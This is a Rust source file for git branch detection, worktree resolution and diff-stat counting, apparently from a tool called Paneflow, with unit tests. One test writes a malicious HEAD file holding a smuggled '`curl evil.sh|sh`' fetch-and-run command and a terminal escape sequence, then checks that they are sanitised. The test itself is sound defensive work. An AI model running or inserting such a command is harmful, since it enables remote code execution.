#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct GitDiffStats {
    pub files_changed: usize,
    pub insertions: usize,
    pub deletions: usize,
    pub untracked_capped: bool,
    pub unavailable: bool,
}

const REFTABLE_HEAD: &str = "ref: refs/heads/.invalid";

const GIT_DIFF_STAT_DEADLINE: std::time::Duration = std::time::Duration::from_secs(10);

const GIT_DIFF_STAT_STDOUT_CAP: u64 = 256 * 1024;

const EMPTY_TREE_SHA: &str = "4b825dc642cb6eb9a060e54bf8d69288fbee4904";
const GIT_DIFF_STAT_UNTRACKED_FILE_CAP: usize = 200;
const GIT_DIFF_STAT_UNTRACKED_PATH_CAP: usize = 1000;
const GIT_DIFF_STAT_FILE_BYTES_CAP: u64 = 512 * 1024;

impl GitDiffStats {
    pub fn from_cwd(cwd: &str) -> Self {
        Self::from_cwd_until(cwd, std::time::Instant::now() + GIT_DIFF_STAT_DEADLINE)
    }

    fn from_cwd_until(cwd: &str, deadline: std::time::Instant) -> Self {
        let Some(remaining) = deadline.checked_duration_since(std::time::Instant::now()) else {
            return Self::unavailable();
        };
        let base = match resolve_head(std::path::Path::new(cwd), remaining) {
            Ok(Some(sha)) => sha,
            Ok(None) => EMPTY_TREE_SHA.to_string(),
            Err(_) => return Self::unavailable(),
        };
        let Some(shortstat) =
            diff_stat_git_stdout(cwd, &["diff", "--shortstat", &base, "--"], deadline)
        else {
            return Self::unavailable();
        };
        let mut stats = Self::parse_shortstat(&String::from_utf8_lossy(&shortstat));
        if !stats.add_untracked(cwd, deadline) {
            return Self::unavailable();
        }
        stats
    }

    fn unavailable() -> Self {
        Self {
            unavailable: true,
            ..Self::default()
        }
    }

    pub fn or_previous(self, previous: &Self) -> Self {
        if self.unavailable {
            previous.clone()
        } else {
            self
        }
    }

    pub fn files_changed_label(&self) -> String {
        let plus = if self.untracked_capped { "+" } else { "" };
        let plural = if self.files_changed == 1 && !self.untracked_capped {
            ""
        } else {
            "s"
        };
        format!("{}{plus} file{plural}", self.files_changed)
    }

    fn parse_shortstat(text: &str) -> Self {
        let mut files_changed = 0usize;
        let mut insertions = 0usize;
        let mut deletions = 0usize;

        for part in text.split(',') {
            let trimmed = part.trim();
            if trimmed.contains("file") {
                if let Some(n) = trimmed.split_whitespace().next() {
                    files_changed = n.parse().unwrap_or(0);
                }
            } else if trimmed.contains("insertion") {
                if let Some(n) = trimmed.split_whitespace().next() {
                    insertions = n.parse().unwrap_or(0);
                }
            } else if trimmed.contains("deletion")
                && let Some(n) = trimmed.split_whitespace().next()
            {
                deletions = n.parse().unwrap_or(0);
            }
        }

        Self {
            files_changed,
            insertions,
            deletions,
            ..Self::default()
        }
    }

    pub fn is_empty(&self) -> bool {
        self.files_changed == 0 && self.insertions == 0 && self.deletions == 0
    }

    fn add_untracked(&mut self, cwd: &str, deadline: std::time::Instant) -> bool {
        let Some(remaining) = deadline.checked_duration_since(std::time::Instant::now()) else {
            return false;
        };
        let Some((out, truncated)) = git_stdout_head(
            cwd,
            &[
                "ls-files",
                "--others",
                "--exclude-standard",
                "-z",
                "--",
                ":/",
            ],
            remaining,
            GIT_DIFF_STAT_STDOUT_CAP,
        ) else {
            return false;
        };
        let mut records: Vec<&[u8]> = out.split(|byte| *byte == 0).collect();
        if truncated || !out.ends_with(&[0]) {
            records.pop();
        }
        let paths: Vec<String> = records
            .into_iter()
            .filter(|record| !record.is_empty())
            .map(|record| String::from_utf8_lossy(record).into_owned())
            .collect();
        self.untracked_capped = truncated || paths.len() > GIT_DIFF_STAT_UNTRACKED_PATH_CAP;
        for (idx, path) in paths
            .iter()
            .take(GIT_DIFF_STAT_UNTRACKED_PATH_CAP)
            .enumerate()
        {
            self.files_changed += 1;
            if idx < GIT_DIFF_STAT_UNTRACKED_FILE_CAP && std::time::Instant::now() < deadline {
                self.insertions += untracked_insertions(cwd, path);
            }
        }
        true
    }
}

pub(crate) fn resolve_head(
    cwd: &std::path::Path,
    deadline: std::time::Duration,
) -> Result<Option<String>, String> {
    let mut cmd = crate::git_command::git(
        crate::git_command::GitProfile::Probe,
        ["rev-parse", "--verify", "--quiet", "HEAD^{commit}"],
    );
    cmd.current_dir(cwd);
    let output = crate::git_command::run(cmd, deadline, 4096)
        .map_err(|error| format!("git rev-parse HEAD failed: {error}"))?;
    let sha = String::from_utf8_lossy(&output.stdout).trim().to_string();
    match output.status.code() {
        Some(0) if !sha.is_empty() => Ok(Some(sha)),
        Some(1) if sha.is_empty() && head_is_unborn(cwd, deadline) => Ok(None),
        _ => Err(format!(
            "git could not read HEAD: {}",
            String::from_utf8_lossy(&output.stderr)
                .lines()
                .last()
                .unwrap_or("unknown error")
        )),
    }
}

fn head_is_unborn(cwd: &std::path::Path, deadline: std::time::Duration) -> bool {
    let mut cmd = crate::git_command::git(
        crate::git_command::GitProfile::Probe,
        ["symbolic-ref", "--quiet", "HEAD"],
    );
    cmd.current_dir(cwd);
    crate::git_command::run(cmd, deadline, 4096).is_ok_and(|out| out.status.success())
}

pub(crate) fn git_stdout_head(
    cwd: impl AsRef<std::path::Path>,
    args: &[&str],
    deadline: std::time::Duration,
    stdout_cap: u64,
) -> Option<(Vec<u8>, bool)> {
    let mut cmd = crate::git_command::git(crate::git_command::GitProfile::Probe, args);
    cmd.current_dir(cwd);
    let (output, truncated) =
        paneflow_process::run_with_timeout_keeping_stdout_head(cmd, deadline, stdout_cap).ok()?;
    (truncated || output.status.success()).then_some((output.stdout, truncated))
}

pub(crate) fn git_stdout(
    cwd: impl AsRef<std::path::Path>,
    args: &[&str],
    deadline: std::time::Duration,
    stdout_cap: u64,
) -> Option<Vec<u8>> {
    let mut cmd = crate::git_command::git(crate::git_command::GitProfile::Probe, args);
    cmd.current_dir(cwd);
    let output = crate::git_command::run(cmd, deadline, stdout_cap).ok()?;
    output.status.success().then_some(output.stdout)
}

fn diff_stat_git_stdout(cwd: &str, args: &[&str], deadline: std::time::Instant) -> Option<Vec<u8>> {
    let remaining = deadline.checked_duration_since(std::time::Instant::now())?;
    git_stdout(cwd, args, remaining, GIT_DIFF_STAT_STDOUT_CAP)
}

fn untracked_insertions(cwd: &str, rel_path: &str) -> usize {
    use std::io::Read;

    let path = std::path::Path::new(cwd).join(rel_path);
    match std::fs::symlink_metadata(&path) {
        Ok(meta) if meta.file_type().is_symlink() => std::fs::read_link(&path)
            .map(|target| text_line_count(&target.to_string_lossy()))
            .unwrap_or(0),
        Ok(_) => {
            let Ok((file, _)) = paneflow_home::open_regular_for_reading(&path) else {
                return 0;
            };
            let mut bytes = Vec::new();
            if file
                .take(GIT_DIFF_STAT_FILE_BYTES_CAP + 1)
                .read_to_end(&mut bytes)
                .is_err()
                || bytes.len() as u64 > GIT_DIFF_STAT_FILE_BYTES_CAP
                || bytes.contains(&0)
            {
                return 0;
            }
            String::from_utf8(bytes)
                .map(|text| text_line_count(&text))
                .unwrap_or(0)
        }
        Err(_) => 0,
    }
}

fn text_line_count(text: &str) -> usize {
    if text.is_empty() {
        0
    } else {
        text.lines().count()
    }
}

pub(super) fn read_capped(path: &std::path::Path, limit: u64) -> std::io::Result<String> {
    use std::io::Read;
    let file = std::fs::File::open(path)?;
    let mut content = String::new();
    file.take(limit).read_to_string(&mut content)?;
    Ok(content)
}

pub fn find_git_dir(cwd: &str) -> Option<std::path::PathBuf> {
    let mut search_dir = std::path::Path::new(cwd);
    let git_path = loop {
        let candidate = search_dir.join(".git");
        if candidate.exists() {
            break candidate;
        }
        search_dir = search_dir.parent()?;
    };

    if git_path.is_file() {
        let content = read_capped(&git_path, 512).ok()?;
        let gitdir = content.trim().strip_prefix("gitdir: ")?.to_owned();
        let gitdir_path = if std::path::Path::new(&gitdir).is_absolute() {
            std::path::PathBuf::from(&gitdir)
        } else {
            git_path
                .parent()
                .unwrap_or(std::path::Path::new(cwd))
                .join(&gitdir)
        };
        Some(gitdir_path)
    } else if git_path.is_dir() {
        Some(git_path)
    } else {
        None
    }
}

fn canonicalize_or(path: &std::path::Path) -> std::path::PathBuf {
    crate::runtime_paths::strip_verbatim_prefix(
        std::fs::canonicalize(path).unwrap_or_else(|_| path.to_path_buf()),
    )
}

fn normalize_lexically(path: &std::path::Path) -> std::path::PathBuf {
    use std::path::Component;
    let mut stack: Vec<Component> = Vec::new();
    for comp in path.components() {
        match comp {
            Component::CurDir => {}
            Component::ParentDir => match stack.last() {
                Some(Component::Normal(_)) => {
                    stack.pop();
                }
                _ => stack.push(comp),
            },
            other => stack.push(other),
        }
    }
    let mut out = std::path::PathBuf::new();
    for comp in stack {
        out.push(comp.as_os_str());
    }
    out
}

pub fn resolve_main_git_dir(git_dir: &std::path::Path) -> Option<std::path::PathBuf> {
    let commondir_file = git_dir.join("commondir");
    let main_git_dir = if commondir_file.is_file() {
        let content = read_capped(&commondir_file, 512).ok()?;
        let rel = content.trim();
        if rel.is_empty() {
            return None;
        }
        let p = std::path::Path::new(rel);
        if p.is_absolute() {
            p.to_path_buf()
        } else {
            normalize_lexically(&git_dir.join(p))
        }
    } else {
        git_dir.to_path_buf()
    };
    Some(canonicalize_or(&main_git_dir))
}

pub fn resolve_repo_root(git_dir: &std::path::Path) -> (Option<std::path::PathBuf>, bool) {
    let is_worktree = git_dir.join("commondir").is_file();
    let repo_root = resolve_main_git_dir(git_dir)
        .and_then(|main_git| main_git.parent().map(|p| p.to_path_buf()));
    (repo_root, is_worktree)
}

pub fn resolve_worktree_root(
    cwd: &str,
    git_dir: Option<&std::path::Path>,
    repo_root: Option<&std::path::Path>,
    is_worktree: bool,
) -> std::path::PathBuf {
    if !is_worktree {
        return repo_root
            .map(std::path::Path::to_path_buf)
            .unwrap_or_else(|| std::path::PathBuf::from(cwd));
    }

    let Some(git_dir) = git_dir else {
        return std::path::PathBuf::from(cwd);
    };
    let content = read_capped(&git_dir.join("gitdir"), 512).ok();
    let Some(raw) = content.as_deref().map(str::trim).filter(|s| !s.is_empty()) else {
        return std::path::PathBuf::from(cwd);
    };
    let git_file = std::path::Path::new(raw);
    let git_file = if git_file.is_absolute() {
        git_file.to_path_buf()
    } else {
        normalize_lexically(&git_dir.join(git_file))
    };
    git_file
        .parent()
        .map(canonicalize_or)
        .unwrap_or_else(|| std::path::PathBuf::from(cwd))
}

pub(super) fn parse_head(git_dir: &std::path::Path) -> (String, bool) {
    let head_path = git_dir.join("HEAD");
    let content = match read_capped(&head_path, 512) {
        Ok(c) => c,
        Err(_) => return (String::new(), true),
    };
    let content = content.trim();

    if content == REFTABLE_HEAD {
        (String::new(), true)
    } else if let Some(branch) = content.strip_prefix("ref: refs/heads/") {
        (branch.chars().filter(|c| !c.is_control()).collect(), true)
    } else if content.chars().all(|c| c.is_ascii_hexdigit())
        && (content.len() == 40 || content.len() == 64)
    {
        let short = &content[..7];
        (format!("({short})"), true)
    } else {
        (String::new(), true)
    }
}

pub fn detect_branch(cwd: &str) -> (String, bool) {
    match find_git_dir(cwd) {
        Some(git_dir) if uses_reftable(&git_dir) => (branch_from_git(cwd), true),
        Some(git_dir) => parse_head(&git_dir),
        None => (String::new(), false),
    }
}

fn uses_reftable(git_dir: &std::path::Path) -> bool {
    read_capped(&git_dir.join("HEAD"), 512).is_ok_and(|head| head.trim() == REFTABLE_HEAD)
}

fn branch_from_git(cwd: &str) -> String {
    let deadline = std::time::Duration::from_secs(5);
    if let Some(branch) = git_stdout(
        cwd,
        &["symbolic-ref", "--quiet", "--short", "HEAD"],
        deadline,
        4096,
    )
    .map(|out| String::from_utf8_lossy(&out).trim().to_string())
    .filter(|branch| !branch.is_empty())
    {
        return branch.chars().filter(|c| !c.is_control()).collect();
    }
    git_stdout(cwd, &["rev-parse", "--short=7", "HEAD"], deadline, 4096)
        .map(|out| String::from_utf8_lossy(&out).trim().to_string())
        .filter(|sha| !sha.is_empty())
        .map(|sha| format!("({sha})"))
        .unwrap_or_default()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn canonical_expectation(path: &std::path::Path) -> std::path::PathBuf {
        crate::runtime_paths::strip_verbatim_prefix(std::fs::canonicalize(path).unwrap())
    }

    #[test]
    fn detect_branch_normal_branch() {
        let dir = tempfile::tempdir().unwrap();
        let git_dir = dir.path().join(".git");
        std::fs::create_dir(&git_dir).unwrap();
        std::fs::write(git_dir.join("HEAD"), "ref: refs/heads/main\n").unwrap();

        let (branch, is_repo) = detect_branch(dir.path().to_str().unwrap());
        assert_eq!(branch, "main");
        assert!(is_repo);
    }

    #[test]
    fn detect_branch_feature_branch() {
        let dir = tempfile::tempdir().unwrap();
        let git_dir = dir.path().join(".git");
        std::fs::create_dir(&git_dir).unwrap();
        std::fs::write(
            git_dir.join("HEAD"),
            "ref: refs/heads/feature/JIRA-123-oauth\n",
        )
        .unwrap();

        let (branch, is_repo) = detect_branch(dir.path().to_str().unwrap());
        assert_eq!(branch, "feature/JIRA-123-oauth");
        assert!(is_repo);
    }

    #[test]
    fn detect_branch_detached_head() {
        let dir = tempfile::tempdir().unwrap();
        let git_dir = dir.path().join(".git");
        std::fs::create_dir(&git_dir).unwrap();
        std::fs::write(
            git_dir.join("HEAD"),
            "96fa6899ea34697257e84865fefc56beb42d6390\n",
        )
        .unwrap();

        let (branch, is_repo) = detect_branch(dir.path().to_str().unwrap());
        assert_eq!(branch, "(96fa689)");
        assert!(is_repo);
    }

    #[test]
    fn detect_branch_not_a_git_repo() {
        let dir = tempfile::tempdir().unwrap();

        let (branch, is_repo) = detect_branch(dir.path().to_str().unwrap());
        assert_eq!(branch, "");
        assert!(!is_repo);
    }

    #[test]
    fn detect_branch_worktree_file() {
        let dir = tempfile::tempdir().unwrap();
        let worktree_git_dir = dir.path().join("worktree_git");
        std::fs::create_dir(&worktree_git_dir).unwrap();
        std::fs::write(worktree_git_dir.join("HEAD"), "ref: refs/heads/wt-branch\n").unwrap();

        let work_dir = dir.path().join("work");
        std::fs::create_dir(&work_dir).unwrap();
        std::fs::write(
            work_dir.join(".git"),
            format!("gitdir: {}\n", worktree_git_dir.display()),
        )
        .unwrap();

        let (branch, is_repo) = detect_branch(work_dir.to_str().unwrap());
        assert_eq!(branch, "wt-branch");
        assert!(is_repo);
    }

    #[test]
    fn detect_branch_nonexistent_directory() {
        let (branch, is_repo) = detect_branch("/nonexistent/path/that/does/not/exist");
        assert_eq!(branch, "");
        assert!(!is_repo);
    }

    #[test]
    fn detect_branch_worktree_relative_path() {
        let dir = tempfile::tempdir().unwrap();
        let worktree_git_dir = dir
            .path()
            .join("main_repo")
            .join(".git")
            .join("worktrees")
            .join("wt1");
        std::fs::create_dir_all(&worktree_git_dir).unwrap();
        std::fs::write(
            worktree_git_dir.join("HEAD"),
            "ref: refs/heads/relative-wt\n",
        )
        .unwrap();

        let work_dir = dir.path().join("wt1");
        std::fs::create_dir(&work_dir).unwrap();
        std::fs::write(
            work_dir.join(".git"),
            "gitdir: ../main_repo/.git/worktrees/wt1\n",
        )
        .unwrap();

        let (branch, is_repo) = detect_branch(work_dir.to_str().unwrap());
        assert_eq!(branch, "relative-wt");
        assert!(is_repo);
    }

    #[test]
    fn detect_branch_subdirectory_of_repo() {
        let dir = tempfile::tempdir().unwrap();
        let git_dir = dir.path().join(".git");
        std::fs::create_dir(&git_dir).unwrap();
        std::fs::write(git_dir.join("HEAD"), "ref: refs/heads/develop\n").unwrap();

        let sub_dir = dir.path().join("src").join("module");
        std::fs::create_dir_all(&sub_dir).unwrap();

        let (branch, is_repo) = detect_branch(sub_dir.to_str().unwrap());
        assert_eq!(branch, "develop");
        assert!(is_repo);
    }

    #[test]
    fn detect_branch_strips_control_chars_from_malicious_head() {
        let dir = tempfile::tempdir().unwrap();
        let git_dir = dir.path().join(".git");
        std::fs::create_dir(&git_dir).unwrap();
        std::fs::write(
            git_dir.join("HEAD"),
            "ref: refs/heads/main\n`curl evil.sh|sh`\n\x1b]0;spoof\x07",
        )
        .unwrap();

        let (branch, is_repo) = detect_branch(dir.path().to_str().unwrap());
        assert!(is_repo);
        assert!(!branch.contains('\n'), "newline must be stripped");
        assert!(!branch.contains('\r'), "carriage return must be stripped");
        assert!(!branch.contains('\x1b'), "ESC must be stripped");
        assert!(branch.chars().all(|c| !c.is_control()));
        assert!(branch.starts_with("main"));
    }

    #[test]
    fn find_git_dir_normal_repo() {
        let dir = tempfile::tempdir().unwrap();
        let git_dir = dir.path().join(".git");
        std::fs::create_dir(&git_dir).unwrap();

        let result = find_git_dir(dir.path().to_str().unwrap());
        assert_eq!(result, Some(git_dir));
    }

    #[test]
    fn find_git_dir_not_a_repo() {
        let dir = tempfile::tempdir().unwrap();
        let result = find_git_dir(dir.path().to_str().unwrap());
        assert_eq!(result, None);
    }

    #[test]
    fn find_git_dir_worktree() {
        let dir = tempfile::tempdir().unwrap();
        let worktree_git_dir = dir
            .path()
            .join("main_repo")
            .join(".git")
            .join("worktrees")
            .join("wt1");
        std::fs::create_dir_all(&worktree_git_dir).unwrap();

        let work_dir = dir.path().join("wt1");
        std::fs::create_dir(&work_dir).unwrap();
        std::fs::write(
            work_dir.join(".git"),
            format!("gitdir: {}\n", worktree_git_dir.display()),
        )
        .unwrap();

        let result = find_git_dir(work_dir.to_str().unwrap());
        assert_eq!(result, Some(worktree_git_dir));
    }

    #[test]
    fn find_git_dir_subdirectory() {
        let dir = tempfile::tempdir().unwrap();
        let git_dir = dir.path().join(".git");
        std::fs::create_dir(&git_dir).unwrap();

        let sub_dir = dir.path().join("src").join("lib");
        std::fs::create_dir_all(&sub_dir).unwrap();

        let result = find_git_dir(sub_dir.to_str().unwrap());
        assert_eq!(result, Some(git_dir));
    }

    #[test]
    fn resolve_repo_root_normal_repo() {
        let dir = tempfile::tempdir().unwrap();
        let git_dir = dir.path().join(".git");
        std::fs::create_dir(&git_dir).unwrap();

        let (repo_root, is_worktree) = resolve_repo_root(&git_dir);
        assert!(!is_worktree);
        assert_eq!(repo_root, Some(canonical_expectation(dir.path())));
    }

    #[test]
    fn resolve_repo_root_worktree_relative_commondir() {
        let dir = tempfile::tempdir().unwrap();
        let main_git = dir.path().join("main").join(".git");
        std::fs::create_dir_all(&main_git).unwrap();
        let wt_git = main_git.join("worktrees").join("wt1");
        std::fs::create_dir_all(&wt_git).unwrap();
        std::fs::write(wt_git.join("commondir"), "../..\n").unwrap();

        let (repo_root, is_worktree) = resolve_repo_root(&wt_git);
        assert!(is_worktree);
        assert_eq!(
            repo_root,
            Some(canonical_expectation(&dir.path().join("main")))
        );
    }

    #[test]
    fn resolve_repo_root_worktree_absolute_commondir() {
        let dir = tempfile::tempdir().unwrap();
        let main_git = dir.path().join("main").join(".git");
        std::fs::create_dir_all(&main_git).unwrap();
        let wt_git = main_git.join("worktrees").join("wt2");
        std::fs::create_dir_all(&wt_git).unwrap();
        std::fs::write(
            wt_git.join("commondir"),
            format!("{}\n", main_git.display()),
        )
        .unwrap();

        let (repo_root, is_worktree) = resolve_repo_root(&wt_git);
        assert!(is_worktree);
        assert_eq!(
            repo_root,
            Some(canonical_expectation(&dir.path().join("main")))
        );
    }

    #[test]
    fn resolve_worktree_root_uses_stored_gitdir_pointer() {
        let dir = tempfile::tempdir().unwrap();
        let main_git = dir.path().join("main").join(".git");
        let worktree_root = dir.path().join("repo.worktrees").join("feat");
        let worktree_subdir = worktree_root.join("src");
        let wt_git = main_git.join("worktrees").join("feat");
        std::fs::create_dir_all(&worktree_subdir).unwrap();
        std::fs::create_dir_all(&wt_git).unwrap();
        std::fs::write(
            wt_git.join("gitdir"),
            format!("{}\n", worktree_root.join(".git").display()),
        )
        .unwrap();

        let root = resolve_worktree_root(
            worktree_subdir.to_str().unwrap(),
            Some(&wt_git),
            Some(&dir.path().join("main")),
            true,
        );

        assert_eq!(root, canonical_expectation(&worktree_root));
    }

    #[test]
    fn resolve_repo_root_siblings_match() {
        let dir = tempfile::tempdir().unwrap();
        let main_git = dir.path().join("main").join(".git");
        std::fs::create_dir_all(&main_git).unwrap();
        let wt_a = main_git.join("worktrees").join("a");
        let wt_b = main_git.join("worktrees").join("b");
        std::fs::create_dir_all(&wt_a).unwrap();
        std::fs::create_dir_all(&wt_b).unwrap();
        std::fs::write(wt_a.join("commondir"), "../..\n").unwrap();
        std::fs::write(wt_b.join("commondir"), "../..\n").unwrap();

        let (root_a, _) = resolve_repo_root(&wt_a);
        let (root_b, _) = resolve_repo_root(&wt_b);
        assert!(root_a.is_some());
        assert_eq!(root_a, root_b);
    }

    #[test]
    fn normalize_lexically_collapses_dotdot() {
        let wt_git = std::path::Path::new("/nonexistent/main/.git/worktrees/wt1");
        assert_eq!(
            normalize_lexically(&wt_git.join("../..")),
            std::path::PathBuf::from("/nonexistent/main/.git")
        );
        assert_eq!(
            normalize_lexically(std::path::Path::new("../foo/./bar")),
            std::path::PathBuf::from("../foo/bar")
        );
    }

    #[test]
    fn resolve_repo_root_missing_dir() {
        let (repo_root, is_worktree) = resolve_repo_root(std::path::Path::new("/nonexistent/.git"));
        assert!(!is_worktree);
        assert_eq!(repo_root, Some(std::path::PathBuf::from("/nonexistent")));
    }

    #[test]
    fn parse_shortstat_extracts_insertions_and_deletions() {
        let stats =
            GitDiffStats::parse_shortstat(" 3 files changed, 42 insertions(+), 7 deletions(-)");
        assert_eq!(stats.files_changed, 3);
        assert_eq!(stats.insertions, 42);
        assert_eq!(stats.deletions, 7);
        assert!(!stats.is_empty());

        let single = GitDiffStats::parse_shortstat(" 1 file changed, 2 deletions(-)");
        assert_eq!(single.files_changed, 1);
        assert_eq!(single.insertions, 0);
        assert_eq!(single.deletions, 2);
    }

    #[test]
    fn from_cwd_on_non_repo_yields_unavailable_default() {
        let dir = tempfile::tempdir().unwrap();
        let stats = GitDiffStats::from_cwd(dir.path().to_str().unwrap());
        assert!(
            stats.is_empty(),
            "non-repo should yield no stats, got {stats:?}"
        );
    }

    #[test]
    fn from_cwd_counts_staged_and_untracked_changes() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        if !test_git(root, &["init"]) {
            return;
        }
        assert!(test_git(root, &["config", "core.autocrlf", "false"]));
        std::fs::write(root.join("tracked.txt"), "one\n").unwrap();
        assert!(test_git(root, &["add", "tracked.txt"]));
        assert!(test_git(
            root,
            &[
                "-c",
                "user.email=paneflow@example.com",
                "-c",
                "user.name=Paneflow",
                "commit",
                "-m",
                "init",
            ],
        ));

        std::fs::write(root.join("tracked.txt"), "one\ntwo\n").unwrap();
        assert!(test_git(root, &["add", "tracked.txt"]));
        std::fs::write(root.join("untracked.txt"), "alpha\nbeta\n").unwrap();

        let stats = GitDiffStats::from_cwd(root.to_str().unwrap());
        assert_eq!(stats.files_changed, 2);
        assert_eq!(stats.insertions, 3);
        assert_eq!(stats.deletions, 0);
    }

    fn commit_all(root: &std::path::Path, message: &str) {
        assert!(test_git(root, &["add", "-A"]));
        assert!(test_git(
            root,
            &[
                "-c",
                "user.email=paneflow@example.com",
                "-c",
                "user.name=Paneflow",
                "commit",
                "-q",
                "-m",
                message,
            ],
        ));
    }

    #[test]
    fn untracked_files_past_the_cap_show_the_cap_and_a_plus() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        if !test_git(root, &["init", "-q"]) {
            return;
        }
        std::fs::write(root.join("seed.txt"), "seed\n").unwrap();
        commit_all(root, "seed");
        for i in 0..1005 {
            std::fs::write(root.join(format!("u{i:04}.txt")), "").unwrap();
        }
        let stats = GitDiffStats::from_cwd(root.to_str().unwrap());
        assert_eq!(stats.files_changed, GIT_DIFF_STAT_UNTRACKED_PATH_CAP);
        assert!(stats.untracked_capped);
        assert_eq!(stats.files_changed_label(), "1000+ files");
    }

    #[test]
    fn an_untracked_listing_past_the_byte_cap_still_counts_what_it_read() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        if !test_git(root, &["init", "-q"]) {
            return;
        }
        std::fs::write(root.join("seed.txt"), "seed\n").unwrap();
        commit_all(root, "seed");
        let long = "n".repeat(200);
        for bucket in 0..8 {
            let dir = root.join(format!("{long}{bucket}"));
            std::fs::create_dir_all(&dir).unwrap();
            for i in 0..250 {
                std::fs::write(dir.join(format!("{long}{i:03}")), "").unwrap();
            }
        }
        let stats = GitDiffStats::from_cwd(root.to_str().unwrap());
        assert!(stats.untracked_capped, "{stats:?}");
        assert!(!stats.unavailable);
        assert!(stats.files_changed > 0, "a byte cap never reads as 0 files");
        assert!(stats.files_changed <= GIT_DIFF_STAT_UNTRACKED_PATH_CAP);
    }

    #[test]
    fn a_subfolder_workspace_counts_the_untracked_files_of_the_whole_repository() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        if !test_git(root, &["init", "-q"]) {
            return;
        }
        std::fs::create_dir_all(root.join("sub")).unwrap();
        std::fs::write(root.join("sub").join("kept.txt"), "k\n").unwrap();
        commit_all(root, "seed");
        std::fs::write(root.join("top.txt"), "a\nb\n").unwrap();
        std::fs::write(root.join("sub").join("inner.txt"), "c\n").unwrap();
        let stats = GitDiffStats::from_cwd(root.join("sub").to_str().unwrap());
        assert_eq!((stats.files_changed, stats.insertions), (2, 3));
    }

    #[test]
    fn an_unreadable_head_is_an_error_and_an_unborn_branch_is_the_empty_tree() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        if !test_git(root, &["init", "-q"]) {
            return;
        }
        std::fs::write(root.join("new.txt"), "x\n").unwrap();
        assert_eq!(resolve_head(root, GIT_DIFF_STAT_DEADLINE), Ok(None));
        let unborn = GitDiffStats::from_cwd(root.to_str().unwrap());
        assert!(!unborn.unavailable);
        assert_eq!(unborn.files_changed, 1);

        commit_all(root, "first");
        let branch = String::from_utf8(
            std::process::Command::new("git")
                .args(["symbolic-ref", "--short", "HEAD"])
                .current_dir(root)
                .output()
                .unwrap()
                .stdout,
        )
        .unwrap();
        let head_ref = root
            .join(".git")
            .join("refs")
            .join("heads")
            .join(branch.trim());
        std::fs::write(&head_ref, "not-a-sha\n").unwrap();
        assert!(resolve_head(root, GIT_DIFF_STAT_DEADLINE).is_err());
        let broken = GitDiffStats::from_cwd(root.to_str().unwrap());
        assert!(
            broken.unavailable,
            "a broken HEAD is never shown as 0 files"
        );
    }

    #[test]
    fn a_reftable_repository_shows_its_real_branch() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        if !test_git(
            root,
            &["init", "-q", "--ref-format=reftable", "-b", "trunk"],
        ) {
            return;
        }
        let git_dir = root.join(".git");
        assert_eq!(
            parse_head(&git_dir).0,
            "",
            "the placeholder is never displayed"
        );
        assert_eq!(
            detect_branch(root.to_str().unwrap()),
            ("trunk".to_string(), true)
        );
    }

    #[test]
    fn the_badge_probes_share_one_deadline() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        if !test_git(root, &["init"]) {
            return;
        }
        std::fs::write(root.join("untracked.txt"), "a\n").unwrap();
        let started = std::time::Instant::now();
        let stats = GitDiffStats::from_cwd_until(root.to_str().unwrap(), started);
        assert!(
            started.elapsed() < std::time::Duration::from_millis(500),
            "no probe may start once the shared deadline has passed"
        );
        assert!(stats.is_empty());
        assert_eq!(
            GitDiffStats::from_cwd(root.to_str().unwrap()).files_changed,
            1
        );
    }

    #[test]
    fn shortstat_counts_survive_a_french_locale() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        if !test_git(root, &["init"]) {
            return;
        }
        assert!(test_git(root, &["config", "core.autocrlf", "false"]));
        std::fs::write(root.join("tracked.txt"), "one\ntwo\n").unwrap();
        assert!(test_git(root, &["add", "tracked.txt"]));
        assert!(test_git(
            root,
            &[
                "-c",
                "user.email=paneflow@example.com",
                "-c",
                "user.name=Paneflow",
                "commit",
                "-m",
                "init",
            ],
        ));
        std::fs::write(root.join("tracked.txt"), "one\nthree\n").unwrap();

        let mut command = crate::git_command::git(
            crate::git_command::GitProfile::Probe,
            ["diff", "--shortstat", "HEAD", "--"],
        );
        command
            .current_dir(root)
            .env("LANG", "fr_FR.UTF-8")
            .env("LC_MESSAGES", "fr_FR.UTF-8");
        let out = crate::git_command::run(command, GIT_DIFF_STAT_DEADLINE, 4096).unwrap();
        let stats = GitDiffStats::parse_shortstat(&String::from_utf8_lossy(&out.stdout));
        assert_eq!(
            (stats.files_changed, stats.insertions, stats.deletions),
            (1, 1, 1)
        );
    }

    fn test_git(cwd: &std::path::Path, args: &[&str]) -> bool {
        std::process::Command::new("git")
            .args(args)
            .current_dir(cwd)
            .env("GIT_TERMINAL_PROMPT", "0")
            .output()
            .map(|out| out.status.success())
            .unwrap_or(false)
    }
}
